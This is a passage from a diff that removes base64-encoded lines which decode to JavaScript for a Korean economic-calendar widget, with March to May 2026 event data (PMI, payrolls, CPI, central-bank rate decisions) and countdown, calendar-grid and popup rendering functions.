-"LHRpdGxlOidJU00g7KCc7KGw7JeFIFBNSSAoM+yblCknLHByZXY6JzQ5LjgnLGZvcmVjYXN0Oic1MC4y",
-"JyxhY3R1YWw6JzUwLjgnLGltcGFjdDon6riw7KSA7ISgIO2ajOuztSDigJQg6rK96riwIO2ZleyepSDs",
-"oITtmZgnLGd1aWRlOidpc21fbWZnJ30sCiAge2RhdGU6JzIwMjYtMDQtMDEnLHRpbWU6JzIzOjMwJyxj",
-"b3VudHJ5Oid1cycsdGl0bGU6J0VJQSDsm5DsnKAg7J6s6rOgJyxwcmV2OicrNi45TScsZm9yZWNhc3Q6",
-"Jy0xLjJNJyxhY3R1YWw6Jys1LjVNJyxpbXBhY3Q6J+yYiOyDgSDsg4Htmowg7Kad6rCAIOKAlCDqs7Xq",
-"uIkg6rO87J6JIOyasOugpCcsZ3VpZGU6J2VpYV9vaWwnfSwKICB7ZGF0ZTonMjAyNi0wNC0wMicsdGlt",
-"ZTonMjE6MzAnLGNvdW50cnk6J3VzJyx0aXRsZTon7Iug6recIOyLpOyXheyImOuLuSDssq3qtawnLHBy",
-"ZXY6JzIyNEsnLGZvcmVjYXN0OicyMjVLJyxhY3R1YWw6JzIyM0snLGltcGFjdDon7JiI7IOBIOyGjO2P",
-"rSDtlZjtmowg4oCUIOqzoOyaqSDslpHtmLgnLGd1aWRlOidqb2JsZXNzJ30sCiAge2RhdGU6JzIwMjYt",
-"MDQtMDMnLHRpbWU6JzIxOjMwJyxjb3VudHJ5Oid1cycsdGl0bGU6J+u5hOuGjeyXhSDst6jsl4XsnpDs",
-"iJggTkZQICgz7JuUKScscHJldjonMTUxSycsZm9yZWNhc3Q6JzE0MEsnLGFjdHVhbDonMjI4SycsaW1w",
-"YWN0OifrjIDqt5zrqqgg7ISc7ZSE65287J207KaIIOKAlCDri6zrn6zCt+q4iOumrCDquInrk7EnLGd1",
-"aWRlOiduZnAnfSwKICB7ZGF0ZTonMjAyNi0wNC0wMycsdGltZTonMjE6MzAnLGNvdW50cnk6J3VzJyx0",
-"aXRsZTon7Iuk7JeF66WgICgz7JuUKScscHJldjonNC4xJScsZm9yZWNhc3Q6JzQuMSUnLGFjdHVhbDon",
-"NC4yJScsaW1wYWN0Oifshoztj60g7IOB7Iq5IOKAlCDqs6Dsmqkg7Zi87KGwJyxndWlkZTonbmZwJ30s",
-"CiAge2RhdGU6JzIwMjYtMDQtMDMnLHRpbWU6JzIyOjQ1Jyxjb3VudHJ5Oid1cycsdGl0bGU6J1MmUOq4",
-"gOuhnOuyjCDshJzruYTsiqQgUE1JICgz7JuUKScscHJldjonNTEuMCcsZm9yZWNhc3Q6JzUxLjUnLGFj",
-"dHVhbDonNTQuNCcsaW1wYWN0OifsmIjsg4Eg7YGwIO2PrSDsg4Htmowg4oCUIOyEnOu5hOyKpOyXhSDq",
-"sJXshLgnLGd1aWRlOidzcF9wbWknfSwKICB7ZGF0ZTonMjAyNi0wNC0wNycsdGltZTonMDg6MDAnLGNv",
-"dW50cnk6J2NuJyx0aXRsZTon7LCo7J207IugIOyEnOu5hOyKpCBQTUkgKDPsm5QpJyxwcmV2Oic1MS40",
-"Jyxmb3JlY2FzdDonNTEuOCcsYWN0dWFsOicnLGltcGFjdDonJyxndWlkZTonY25fcG1pJ30sCiAge2Rh",
-"dGU6JzIwMjYtMDQtMDcnLHRpbWU6JzA5OjAwJyxjb3VudHJ5OidrcicsdGl0bGU6J+yGjOu5hOyekOus",
-"vOqwgCBDUEkgKDPsm5QpJyxwcmV2OicyLjElJyxmb3JlY2FzdDonMi4wJScsYWN0dWFsOicyLjIlJyxp",
-"bXBhY3Q6J+yYiOyDgSDsg4Htmowg4oCUIOycoOqwgCDsg4Hsirkg7JiB7Zal7Jy866GcIOusvOqwgCDs",
-"nqzqsIDsho0nLGd1aWRlOidrcl9jcGknfSwKICB7ZGF0ZTonMjAyNi0wNC0wOCcsdGltZTonMjE6MzAn",
-"LGNvdW50cnk6J3VzJyx0aXRsZTon7IOd7IKw7J6Q66y86rCAIFBQSSAoM+yblCknLHByZXY6JzMuMiUn",
-"LGZvcmVjYXN0OiczLjMlJyxhY3R1YWw6JycsaW1wYWN0OicnLGd1aWRlOidwcGknfSwKICB7ZGF0ZTon",
-"MjAyNi0wNC0wOScsdGltZTonMjE6MzAnLGNvdW50cnk6J3VzJyx0aXRsZTon7IaM67mE7J6Q66y86rCA",
-"IENQSSAoM+yblCknLHByZXY6JzIuOCUnLGZvcmVjYXN0OicyLjclJyxhY3R1YWw6JycsaW1wYWN0Oicn",
-"LGd1aWRlOidjcGknfSwKICB7ZGF0ZTonMjAyNi0wNC0wOScsdGltZTonMjM6MzAnLGNvdW50cnk6J3Vz",
-"Jyx0aXRsZTonRUlBIOybkOycoCDsnqzqs6AnLHByZXY6Jys1LjVNJyxmb3JlY2FzdDonJyxhY3R1YWw6",
-"JycsaW1wYWN0OicnLGd1aWRlOidlaWFfb2lsJ30sCiAge2RhdGU6JzIwMjYtMDQtMTAnLHRpbWU6JzA4",
-"OjAwJyxjb3VudHJ5OidjbicsdGl0bGU6J+ustOyXreyImOyngCAoM+yblCknLHByZXY6JzE3MC41Qics",
-"Zm9yZWNhc3Q6JzE2MC4wQicsYWN0dWFsOicnLGltcGFjdDonJyxndWlkZTonY25fdHJhZGUnfSwKICB7",
-"ZGF0ZTonMjAyNi0wNC0xMCcsdGltZTonMjE6MzAnLGNvdW50cnk6J3VzJyx0aXRsZTon7Iug6recIOyL",
-"pOyXheyImOuLuSDssq3qtawnLHByZXY6JzIyM0snLGZvcmVjYXN0OicyMjVLJyxhY3R1YWw6JycsaW1w",
-"YWN0OicnLGd1aWRlOidqb2JsZXNzJ30sCiAge2RhdGU6JzIwMjYtMDQtMTQnLHRpbWU6JzIxOjMwJyxj",
-"b3VudHJ5Oid1cycsdGl0bGU6J+yGjOunpO2MkOunpCAoM+yblCknLHByZXY6JzAuMiUnLGZvcmVjYXN0",
-"OicwLjQlJyxhY3R1YWw6JycsaW1wYWN0OicnLGd1aWRlOidyZXRhaWwnfSwKICB7ZGF0ZTonMjAyNi0w",
-"NC0xNScsdGltZTonMTA6MDAnLGNvdW50cnk6J2NuJyx0aXRsZTonR0RQIOyEseyepeuloCBRMSAyMDI2",
-"JyxwcmV2Oic1LjQlJyxmb3JlY2FzdDonNC44JScsYWN0dWFsOicnLGltcGFjdDonJyxndWlkZTonY25f",
-"Z2RwJ30sCiAge2RhdGU6JzIwMjYtMDQtMTUnLHRpbWU6JzEwOjAwJyxjb3VudHJ5OidjbicsdGl0bGU6",
-"J+yCsOyXheyDneyCsCAoM+yblCknLHByZXY6JzUuOSUnLGZvcmVjYXN0Oic1LjUlJyxhY3R1YWw6Jycs",
-"aW1wYWN0OicnLGd1aWRlOidjbl9nZHAnfSwKICB7ZGF0ZTonMjAyNi0wNC0xNScsdGltZTonMTA6MDAn",
-"LGNvdW50cnk6J2NuJyx0aXRsZTon7IaM66ek7YyQ66ekICgz7JuUKScscHJldjonNC4wJScsZm9yZWNh",
-"c3Q6JzQuMiUnLGFjdHVhbDonJyxpbXBhY3Q6JycsZ3VpZGU6J2NuX2dkcCd9LAogIHtkYXRlOicyMDI2",
-"LTA0LTE2Jyx0aW1lOicxMDowMCcsY291bnRyeTona3InLHRpdGxlOiftlZzqta3snYDtlokg6riw7KSA",
-"6riI66asIOqysOyglScscHJldjonMi43NSUnLGZvcmVjYXN0OicyLjUwJScsYWN0dWFsOicnLGltcGFj",
-"dDonJyxndWlkZTonYm9rX3JhdGUnfSwKICB7ZGF0ZTonMjAyNi0wNC0xNicsdGltZTonMjM6MzAnLGNv",
-"dW50cnk6J3VzJyx0aXRsZTonRUlBIOybkOycoCDsnqzqs6AnLHByZXY6JycsZm9yZWNhc3Q6JycsYWN0",
-"dWFsOicnLGltcGFjdDonJyxndWlkZTonZWlhX29pbCd9LAogIHtkYXRlOicyMDI2LTA0LTE3Jyx0aW1l",
-"OicyMTozMCcsY291bnRyeTondXMnLHRpdGxlOifsi6Dqt5wg7Iuk7JeF7IiY64u5IOyyreq1rCcscHJl",
-"djonMjIzSycsZm9yZWNhc3Q6JzIyNUsnLGFjdHVhbDonJyxpbXBhY3Q6JycsZ3VpZGU6J2pvYmxlc3Mn",
-"fSwKICB7ZGF0ZTonMjAyNi0wNC0xNycsdGltZTonMjE6MzAnLGNvdW50cnk6J3VzJyx0aXRsZTon7KO8",
-"7YOd7LCp6rO16rG07IiYICgz7JuUKScscHJldjonMS41MDFNJyxmb3JlY2FzdDonMS40ODBNJyxhY3R1",
-"YWw6JycsaW1wYWN0OicnLGd1aWRlOidob3VzaW5nJ30sCiAge2RhdGU6JzIwMjYtMDQtMjgnLHRpbWU6",
-"JzEyOjAwJyxjb3VudHJ5OidqcCcsdGl0bGU6J0JPSiDquLDspIDquIjrpqwg6rKw7KCVJyxwcmV2Oicw",
-"LjUwJScsZm9yZWNhc3Q6JzAuNzUlJyxhY3R1YWw6JycsaW1wYWN0OicnLGd1aWRlOidib2pfcmF0ZSd9",
-"LAogIHtkYXRlOicyMDI2LTA0LTIzJyx0aW1lOicyMTozMCcsY291bnRyeTondXMnLHRpdGxlOifsi6Dq",
-"t5wg7Iuk7JeF7IiY64u5IOyyreq1rCcscHJldjonJyxmb3JlY2FzdDonJyxhY3R1YWw6JycsaW1wYWN0",
-"OicnLGd1aWRlOidqb2JsZXNzJ30sCiAge2RhdGU6JzIwMjYtMDQtMjMnLHRpbWU6JzIyOjQ1Jyxjb3Vu",
-"dHJ5Oid1cycsdGl0bGU6J1MmUCBQTUkg7KCc7KGw7JeFIOyYiOu5hCcscHJldjonNTIuNycsZm9yZWNh",
-"c3Q6JzUyLjUnLGFjdHVhbDonJyxpbXBhY3Q6JycsZ3VpZGU6J3NwX3BtaSd9LAogIHtkYXRlOicyMDI2",
-"LTA0LTI0Jyx0aW1lOicyMTozMCcsY291bnRyeTondXMnLHRpdGxlOifrgrTqtazsnqwg7KO866y4ICgz",
-"7JuUKScscHJldjonLTEuMCUnLGZvcmVjYXN0OicwLjglJyxhY3R1YWw6JycsaW1wYWN0OicnLGd1aWRl",
-"OidkdXJhYmxlJ30sCiAge2RhdGU6JzIwMjYtMDQtMjUnLHRpbWU6JzIxOjMwJyxjb3VudHJ5Oid1cycs",
-"dGl0bGU6J0dEUCBRMSDsho3rs7QnLHByZXY6JzIuNCUnLGZvcmVjYXN0OicxLjIlJyxhY3R1YWw6Jycs",
-"aW1wYWN0OicnLGd1aWRlOidnZHAnfSwKICB7ZGF0ZTonMjAyNi0wNC0yNScsdGltZTonMjE6MzAnLGNv",
-"dW50cnk6J3VzJyx0aXRsZTonUENFIOusvOqwgOyngOyImCAoM+yblCknLHByZXY6JzIuNSUnLGZvcmVj",
-"YXN0OicyLjQlJyxhY3R1YWw6JycsaW1wYWN0OicnLGd1aWRlOidwY2UnfSwKICB7ZGF0ZTonMjAyNi0w",
-"NC0yOScsdGltZTonMTA6MDAnLGNvdW50cnk6J2NuJyx0aXRsZTon7KCc7KGw7JeFIFBNSSAoNOyblCkn",
-"LHByZXY6JzUwLjUnLGZvcmVjYXN0Oic1MC4zJyxhY3R1YWw6JycsaW1wYWN0OicnLGd1aWRlOidjbl9w",
-"bWknfSwKICB7ZGF0ZTonMjAyNi0wNC0zMCcsdGltZTonMDM6MDAnLGNvdW50cnk6J3VzJyx0aXRsZTon",
-"Rk9NQyDquLDspIDquIjrpqwg6rKw7KCVJyxwcmV2OiczLjUwfjMuNzUlJyxmb3JlY2FzdDonMy41MH4z",
-"Ljc1JScsYWN0dWFsOicnLGltcGFjdDonJyxndWlkZTonZm9tYyd9LAogIC8vIOKVkOKVkOKVkOKVkOKV",
-"kOKVkOKVkOKVkCAyMDI264WEIDXsm5Qg4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQCiAge2RhdGU6JzIw",
-"MjYtMDUtMDEnLHRpbWU6JzIxOjMwJyxjb3VudHJ5Oid1cycsdGl0bGU6J+u5hOuGjeyXhSDst6jsl4Xs",
-"npDsiJggTkZQICg07JuUKScscHJldjonMjI4SycsZm9yZWNhc3Q6JzE4MEsnLGFjdHVhbDonJyxpbXBh",
-"Y3Q6JycsZ3VpZGU6J25mcCd9LAogIHtkYXRlOicyMDI2LTA1LTEzJyx0aW1lOicyMTozMCcsY291bnRy",
-"eTondXMnLHRpdGxlOifshozruYTsnpDrrLzqsIAgQ1BJICg07JuUKScscHJldjonJyxmb3JlY2FzdDon",
-"JyxhY3R1YWw6JycsaW1wYWN0OicnLGd1aWRlOidjcGknfSwKICB7ZGF0ZTonMjAyNi0wNS0xNScsdGlt",
-"ZTonMTA6MDAnLGNvdW50cnk6J2NuJyx0aXRsZTonR0RQwrfsgrDsl4Xsg53sgrAg67Cc7ZGcJyxwcmV2",
-"OicnLGZvcmVjYXN0OicnLGFjdHVhbDonJyxpbXBhY3Q6JycsZ3VpZGU6J2NuX2dkcCd9LApdOwoKLy8g",
-"4pSA4pSA4pSAIOqzte2GtSDrs4DsiJgg4pSA4pSA4pSACnZhciBDVFJZX0ZMQUc9e3VzOifwn4e68J+H",
-"uCcsY246J/Cfh6jwn4ezJyxrcjon8J+HsPCfh7cnLGpwOifwn4ev8J+HtSd9Owp2YXIgQ1RSWV9OQU1F",
-"PXt1czon8J+HuvCfh7gg66+46rWtJyxjbjon8J+HqPCfh7Mg7KSR6rWtJyxrcjon8J+HsPCfh7cg7ZWc",
-"6rWtJyxqcDon8J+Hr/Cfh7Ug7J2867O4J307CnZhciBNT05USF9LTz1bJzHsm5QnLCcy7JuUJywnM+yb",
-"lCcsJzTsm5QnLCc17JuUJywnNuyblCcsJzfsm5QnLCc47JuUJywnOeyblCcsJzEw7JuUJywnMTHsm5Qn",
-"LCcxMuyblCddOwp2YXIgRE9XX0tPPVsn7J28Jywn7JuUJywn7ZmUJywn7IiYJywn66qpJywn6riIJywn",
-"7YagJ107CnZhciBjYWxZZWFyPTIwMjYsIGNhbE1vbnRoPTM7CnZhciBjZEludGVydmFsPW51bGw7Cgov",
-"LyDilIDilIDilIAg7Lm07Jq07Yq464uk7Jq0IOKUgOKUgOKUgApmdW5jdGlvbiBnZXROZXh0RXZlbnQo",
-"KXsKICB2YXIgbm93PW5ldyBEYXRlKCk7CiAgdmFyIGxpc3Q9Q0FMX0VWRU5UUy5maWx0ZXIoZnVuY3Rp",
-"b24oZSl7CiAgICBpZihlLmFjdHVhbCkgcmV0dXJuIGZhbHNlOwogICAgdmFyIHA9ZS5kYXRlLnNwbGl0",
-"KCctJyksdD1lLnRpbWUuc3BsaXQoJzonKTsKICAgIHJldHVybiBuZXcgRGF0ZSgrcFswXSwrcFsxXS0x",
-"LCtwWzJdLCt0WzBdLCt0WzFdLDApPm5vdzsKICB9KTsKICBpZighbGlzdC5sZW5ndGgpIHJldHVybiBu",
-"dWxsOwogIGxpc3Quc29ydChmdW5jdGlvbihhLGIpewogICAgZnVuY3Rpb24gRCh4KXt2YXIgcD14LmRh",
-"dGUuc3BsaXQoJy0nKSx0PXgudGltZS5zcGxpdCgnOicpO3JldHVybiBuZXcgRGF0ZSgrcFswXSwrcFsx",
-"XS0xLCtwWzJdLCt0WzBdLCt0WzFdLDApO30KICAgIHJldHVybiBEKGEpLUQoYik7CiAgfSk7CiAgcmV0",
-"dXJuIGxpc3RbMF07Cn0KCmZ1bmN0aW9uIHVwZGF0ZUNvdW50ZG93bigpewogIHZhciBldj1nZXROZXh0",
-"RXZlbnQoKTsKICB2YXIgc2V0PWZ1bmN0aW9uKGlkLHYpe3ZhciBlbD1kb2N1bWVudC5nZXRFbGVtZW50",
-"QnlJZChpZCk7aWYoZWwpZWwudGV4dENvbnRlbnQ9djt9OwogIGlmKCFldil7c2V0KCdjZFRpdGxlJywn",
-"7JiI7KCV65CcIOydtOuypO2KuCDsl4bsnYwnKTtyZXR1cm47fQogIHZhciBwPWV2LmRhdGUuc3BsaXQo",
-"Jy0nKSx0PWV2LnRpbWUuc3BsaXQoJzonKTsKICB2YXIgZGlmZj1NYXRoLm1heCgwLE1hdGguZmxvb3Io",
-"KG5ldyBEYXRlKCtwWzBdLCtwWzFdLTEsK3BbMl0sK3RbMF0sK3RbMV0sMCktbmV3IERhdGUoKSkvMTAw",
-"MCkpOwogIHZhciBwYWQ9ZnVuY3Rpb24obil7cmV0dXJuIG48MTA/JzAnK246Jycrbjt9OwogIHNldCgn",
-"Y2RUaXRsZScsZXYudGl0bGUpOwogIHNldCgnY2RNZXRhJywoQ1RSWV9GTEFHW2V2LmNvdW50cnldfHwn",
-"JykrJyAnK2V2LmRhdGUrJyAnK2V2LnRpbWUrJyBLU1QnKTsKICB2YXIgX2c9ZXYuZ3VpZGU/RVZFTlRf",
-"R1VJREVTW2V2Lmd1aWRlXTpudWxsOwogIHNldCgnY2REZXNjJyxfZyYmX2cuZGVzYz9fZy5kZXNjOicn",
-"KTsKICBzZXQoJ2NkRCcsTWF0aC5mbG9vcihkaWZmLzg2NDAwKSk7CiAgc2V0KCdjZEgnLHBhZChNYXRo",
-"LmZsb29yKChkaWZmJTg2NDAwKS8zNjAwKSkpOwogIHNldCgnY2RNJyxwYWQoTWF0aC5mbG9vcigoZGlm",
-"ZiUzNjAwKS82MCkpKTsKICBzZXQoJ2NkUycscGFkKGRpZmYlNjApKTsKfQoKZnVuY3Rpb24gc3RhcnRD",
-"b3VudGRvd24oKXsKICB1cGRhdGVDb3VudGRvd24oKTsKICBpZihjZEludGVydmFsKSBjbGVhckludGVy",
-"dmFsKGNkSW50ZXJ2YWwpOwogIGNkSW50ZXJ2YWw9c2V0SW50ZXJ2YWwodXBkYXRlQ291bnRkb3duLDEw",
-"MDApOwp9CgovLyDilIDilIDilIAg7LqY66aw642UIOugjOuNlOungSDilIDilIDilIAKZnVuY3Rpb24g",
-"Y2FsUHJldigpe2NhbE1vbnRoLS07aWYoY2FsTW9udGg8MCl7Y2FsTW9udGg9MTE7Y2FsWWVhci0tO31y",
-"ZW5kZXJDYWxlbmRhcigpO30KZnVuY3Rpb24gY2FsTmV4dCgpe2NhbE1vbnRoKys7aWYoY2FsTW9udGg+",
-"MTEpe2NhbE1vbnRoPTA7Y2FsWWVhcisrO31yZW5kZXJDYWxlbmRhcigpO30KCmZ1bmN0aW9uIHJlbmRl",
-"ckNhbGVuZGFyKCl7CiAgdmFyIGxibD1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnY2FsTW9udGhMYWJl",
-"bCcpOwogIGlmKGxibCkgbGJsLnRleHRDb250ZW50PWNhbFllYXIrJ+uFhCAnK01PTlRIX0tPW2NhbE1v",
-"bnRoXTsKICByZW5kZXJDYWxHcmlkKCk7CiAgcmVuZGVyQ2FsU3VtbWFyeSgpOwp9CgpmdW5jdGlvbiBy",
-"ZW5kZXJDYWxTdW1tYXJ5KCl7CiAgdmFyIGxpc3Q9ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2NhbFN1",
-"bW1hcnlMaXN0Jyk7CiAgaWYoIWxpc3QpIHJldHVybjsKICB2YXIgZXZzPUNBTF9FVkVOVFMuZmlsdGVy",
-"KGZ1bmN0aW9uKGUpewogICAgdmFyIGQ9bmV3IERhdGUoZS5kYXRlKTsKICAgIHJldHVybiBkLmdldEZ1",
-"bGxZZWFyKCk9PT1jYWxZZWFyJiZkLmdldE1vbnRoKCk9PT1jYWxNb250aDsKICB9KTsKICBpZighZXZz",
-"Lmxlbmd0aCl7bGlzdC5pbm5lckhUTUw9JzxkaXYgc3R5bGU9ImZvbnQtc2l6ZToxM3B4O2NvbG9yOnZh",
-"cigtLXRleHQyKSI+7J2064usIOuTseuhneuQnCDsp4DtkZzqsIAg7JeG7Iq164uI64ukLjwvZGl2Pic7",
-"cmV0dXJuO30KICB2YXIgaHRtbD0nJzsKICBldnMuZm9yRWFjaChmdW5jdGlvbihlKXsKICAgIHZhciBk",
-"PW5ldyBEYXRlKGUuZGF0ZSk7CiAgICB2YXIgZG9uZT1lLmFjdHVhbD8nPHNwYW4gc3R5bGU9ImNvbG9y",
-"OiMwMGM4OTY7Zm9udC1zaXplOjEwcHgiPiDinJM8L3NwYW4+JzonJzsKICAgIGh0bWwrPSc8ZGl2IGNs",
-"YXNzPSJjYWwtc3VtbWFyeS1pdGVtIj4nCiAgICAgICAgKyc8c3BhbiBjbGFzcz0iY2FsLXN1bW1hcnkt",
-"ZGF5Ij4nKyhkLmdldE1vbnRoKCkrMSkrJy8nKyhkLmdldERhdGUoKSkrJzwvc3Bhbj4nCiAgICAgICAg",
-"Kyc8c3BhbiBjbGFzcz0iY2FsLXN1bW1hcnktdGltZSI+JytlLnRpbWUrJyBLU1Q8L3NwYW4+JwogICAg",
-"ICAgICsnPHNwYW4gY2xhc3M9ImNhbC1zdW1tYXJ5LXRleHQiPicrKENUUllfRkxBR1tlLmNvdW50cnld",
-"fHwnJykrJyAnK2UudGl0bGUrZG9uZSsnPC9zcGFuPicKICAgICAgICArJzwvZGl2Pic7CiAgfSk7CiAg",
-"bGlzdC5pbm5lckhUTUw9aHRtbDsKfQoKZnVuY3Rpb24gcmVuZGVyQ2FsR3JpZCgpewogIHZhciBncmlk",
-"PWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdjYWxHcmlkJyk7CiAgaWYoIWdyaWQpIHJldHVybjsKICB2",
-"YXIgaHRtbD0nJzsKICBET1dfS08uZm9yRWFjaChmdW5jdGlvbihkKXtodG1sKz0nPGRpdiBjbGFzcz0i",
-"Y2FsLWRvdyI+JytkKyc8L2Rpdj4nO30pOwogIHZhciBmaXJzdERheT1uZXcgRGF0ZShjYWxZZWFyLGNh",
-"bE1vbnRoLDEpLmdldERheSgpOwogIHZhciBsYXN0RGF0ZT1uZXcgRGF0ZShjYWxZZWFyLGNhbE1vbnRo",
-"KzEsMCkuZ2V0RGF0ZSgpOwogIHZhciBwcmV2TGFzdD1uZXcgRGF0ZShjYWxZZWFyLGNhbE1vbnRoLDAp",
-"LmdldERhdGUoKTsKICB2YXIgdG9kYXk9bmV3IERhdGUoKTsKICBmb3IodmFyIGk9MDtpPGZpcnN0RGF5",
-"O2krKykKICAgIGh0bWwrPSc8ZGl2IGNsYXNzPSJjYWwtY2VsbCBvdGhlci1tb250aCI+PGRpdiBjbGFz",
-"cz0iY2FsLWRhdGUiPicrKHByZXZMYXN0LWZpcnN0RGF5KzEraSkrJzwvZGl2PjwvZGl2Pic7CiAgZm9y",
-"KHZhciBkPTE7ZDw9bGFzdERhdGU7ZCsrKXsKICAgIHZhciBpc1RvZGF5PSh0b2RheS5nZXRGdWxsWWVh",
-"cigpPT09Y2FsWWVhciYmdG9kYXkuZ2V0TW9udGgoKT09PWNhbE1vbnRoJiZ0b2RheS5nZXREYXRlKCk9",
-"PT1kKTsKICAgIHZhciBkb3c9bmV3IERhdGUoY2FsWWVhcixjYWxNb250aCxkKS5nZXREYXkoKTsKICAg",
-"IHZhciBjbHM9J2NhbC1jZWxsJysoaXNUb2RheT8nIHRvZGF5JzonJykrKGRvdz09PTB8fGRvdz09PTY/",
-"JyB3ZWVrZW5kJzonJyk7CiAgICB2YXIgbW09KGNhbE1vbnRoKzE8MTA/JzAnOicnKSsoY2FsTW9udGgr",
-"MSksIGRkPShkPDEwPycwJzonJykrZDsKICAgIHZhciBkcz1jYWxZZWFyKyctJyttbSsnLScrZGQ7CiAg",
-"ICB2YXIgZGF5RXZzPUNBTF9FVkVOVFMuZmlsdGVyKGZ1bmN0aW9uKGUpe3JldHVybiBlLmRhdGU9PT1k",
-"czt9KTsKICAgIGh0bWwrPSc8ZGl2IGNsYXNzPSInK2NscysnIj48ZGl2IGNsYXNzPSJjYWwtZGF0ZSI+",
-"JytkKyc8L2Rpdj48ZGl2IGNsYXNzPSJjYWwtZXZlbnRzIj4nOwogICAgZGF5RXZzLmZvckVhY2goZnVu",
-"Y3Rpb24oZSxpZHgpewogICAgICBpZihpZHg9PT0zKXtodG1sKz0nPGRpdiBjbGFzcz0iY2FsLWV2ZW50",
-"IG1vcmUiPisnKyhkYXlFdnMubGVuZ3RoLTMpKyfqsbQ8L2Rpdj4nO3JldHVybjt9CiAgICAgIGlmKGlk",
-"eD4zKSByZXR1cm47CiAgICAgIHZhciBtYXJrPWUuYWN0dWFsPycg4pyTJzonJzsKICAgICAgaHRtbCs9",
-"JzxkaXYgY2xhc3M9ImNhbC1ldmVudCAnK2UuY291bnRyeSsnIiBvbmNsaWNrPVwnc2hvd0NhbFBvcHVw",
-"KCcrSlNPTi5zdHJpbmdpZnkoSlNPTi5zdHJpbmdpZnkoZSkpKycpXCc+JytlLnRpdGxlLnNsaWNlKDAs",
-"MTMpK21hcmsrJzwvZGl2Pic7CiAgICB9KTsKICAgIGh0bWwrPSc8L2Rpdj48L2Rpdj4nOwogIH0KICB2",
-"YXIgcmVtPSg3LShmaXJzdERheStsYXN0RGF0ZSklNyklNzsKICBmb3IodmFyIGo9MTtqPD1yZW07aisr",
-"KQogICAgaHRtbCs9JzxkaXYgY2xhc3M9ImNhbC1jZWxsIG90aGVyLW1vbnRoIj48ZGl2IGNsYXNzPSJj",
-"YWwtZGF0ZSI+JytqKyc8L2Rpdj48L2Rpdj4nOwogIGdyaWQuaW5uZXJIVE1MPWh0bWw7Cn0KCi8vIOKU",
-"gOKUgOKUgCDtjJ3sl4UgKOyekOyCsCDsmIHtlqUg6rCA7J2065OcIO2PrO2VqCkg4pSA4pSA4pSACmZ1",
-"bmN0aW9uIHNob3dDYWxQb3B1cChqc29uU3RyKXsKICB2YXIgZT1KU09OLnBhcnNlKGpzb25TdHIpOwog",
-"IHZhciBzZXQ9ZnVuY3Rpb24oaWQsdil7dmFyIGVsPWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKGlkKTtp",
-"ZihlbCllbC50ZXh0Q29udGVudD12O307CiAgc2V0KCdwb3BEYXRlJyxlLmRhdGUpOwogIHNldCgncG9w",
-"VGl0bGUnLGUudGl0bGUpOwogIHNldCgncG9wSW1wb3J0YW5jZScsJ+KYheKYheKYhScpOwogIHNldCgn",
-"cG9wVGltZScsKGUudGltZXx8J+KAlCcpKycgS1NUJyk7CiAgc2V0KCdwb3BQcmV2JyxlLnByZXZ8fCfi",
-"gJQnKTsKICBzZXQoJ3BvcEZvcmVjYXN0JyxlLmZvcmVjYXN0fHwn4oCUJyk7CiAgLy8g6rWt6rCAIOux",
-"g+yngAogIHZhciBjRWw9ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3BvcENvdW50cnknKTsKICBpZihj",
-"RWwpe2NFbC50ZXh0Q29udGVudD1DVFJZX05BTUVbZS5jb3VudHJ5XXx8ZS5jb3VudHJ5O2NFbC5jbGFz",
-"c05hbWU9J2NhbC1wb3B1cC1jb3VudHJ5ICcrKGUuY291bnRyeXx8JycpO30KICAvLyDsi6TsoJzqsJIg",
-"KOuwnO2RnCDtm4Trp4wg7ZGc7IucKQogIHZhciBhY3RSb3c9ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQo",
-"J3BvcEFjdHVhbFJvdycpOwogIHZhciBhY3RFbD1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncG9wQWN0",
-"dWFsJyk7CiAgaWYoYWN0Um93JiZhY3RFbCl7CiAgICBhY3RSb3cuc3R5bGUuZGlzcGxheT1lLmFjdHVh",
-"bD8nJzonbm9uZSc7CiAgICBhY3RFbC50ZXh0Q29udGVudD1lLmFjdHVhbHx8Jyc7CiAgfQogIC8vIOyL",
-"nOyepSDrsJjsnZEgKOuwnO2RnCDtm4Trp4wg7ZGc7IucKQogIHZhciBpbXBSb3c9ZG9jdW1lbnQuZ2V0",
-"RWxlbWVudEJ5SWQoJ3BvcEltcGFjdFJvdycpOwogIGlmKGltcFJvdyl7CiAgICBpbXBSb3cuc3R5bGUu",
-"ZGlzcGxheT1lLmltcGFjdD8nJzonbm9uZSc7CiAgICBzZXQoJ3BvcEltcGFjdCcsZS5pbXBhY3R8fCcn",
-"KTsKICB9CiAgLy8g7J6Q7IKwIOyYge2WpSDqsIDsnbTrk5wKICB2YXIgZ1dyYXA9ZG9jdW1lbnQuZ2V0",
-"RWxlbWVudEJ5SWQoJ3BvcEd1aWRlV3JhcCcpOwogIHZhciBnVGFibGU9ZG9jdW1lbnQuZ2V0RWxlbWVu",
-"dEJ5SWQoJ3BvcEd1aWRlVGFibGUnKTsKICB2YXIgZ05vdGU9ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQo",
-"J3BvcEd1aWRlTm90ZScpOwogIHZhciBndWlkZT1lLmd1aWRlP0VWRU5UX0dVSURFU1tlLmd1aWRlXTpu",
-"dWxsOwogIGlmKGdXcmFwJiZndWlkZSl7CiAgICBnV3JhcC5zdHlsZS5kaXNwbGF5PScnOwogICAgaWYo",
-"Z1RhYmxlKXsKICAgICAgdmFyIHJvd3M9Jyc7CiAgICAgIGd1aWRlLmFzc2V0cy5mb3JFYWNoKGZ1bmN0",
-"aW9uKGEpewogICAgICAgIHJvd3MrPSc8dHI+PHRkPicrYS5uYW1lKyc8L3RkPjx0ZD4nK2EudXArJzwv",
-"dGQ+PHRkPicrYS5kb3duKyc8L3RkPjwvdHI+JzsKICAgICAgfSk7CiAgICAgIGdUYWJsZS5pbm5lckhU",
-"TUw9cm93czsKICAgIH0KICAgIGlmKGdOb3RlKSBnTm90ZS50ZXh0Q29udGVudD1ndWlkZS5ub3RlfHwn",
-"JzsKICB9IGVsc2UgaWYoZ1dyYXApewogICAgZ1dyYXAuc3R5bGUuZGlzcGxheT0nbm9uZSc7CiAgfQog",
